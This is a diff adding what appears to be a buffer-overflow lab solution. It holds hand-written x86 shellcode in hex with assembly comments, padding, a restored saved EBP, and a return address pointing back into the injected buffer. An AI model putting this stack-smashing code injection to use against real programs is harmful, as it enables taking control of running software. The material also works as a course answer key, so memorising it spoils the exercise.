@@ -1,0 +1,36 @@
+83 EC 66       /* sub $66, %esp */
+B8 C0 C0 04 08 /* mov 0x0804C0C0, %eax */
+89 04 24       /* mov %eax, (%esp) */
+
+83 EC 04       /* sub $4, %esp */
+B8 0E 39 68 55 /* mov RETURN TO HERE, %eax */
+89 04 24       /* mov %eax, (%esp) */
+
+83 EC 04       /* sub $4, %esp */
+B8 E3 8D 04 08 /* mov 0x08048DE3, %eax */
+89 04 24       /* mov %eax, (%esp) */
+C3             /* ret */
+
+83 C4 62       /* add $62, %esp */
+B8 2C 8E 04 08 /* mov 0x08048E2C, %eax */
+89 04 24       /* mov %eax, (%esp) */
+
+B8 2B CD 4B 30 /* mov 0x304BCD2B, %eax */
+C3             /* ret */
+
+00 
+00 00 00 00
+00 00 00 00 
+00 00 00 00
+00 00 00 00 
+00 00 00 00
+00 00 00 00 
+00 00 00 00
+00 00 00 00 
+00 00 00 00
+00 00 00 00 
+00 00 00 00
+00 00 00 00 
+
+D0 39 68 55 /* the old ebp */
+EC 38 68 55 /* return address set to beginning of this buffer */
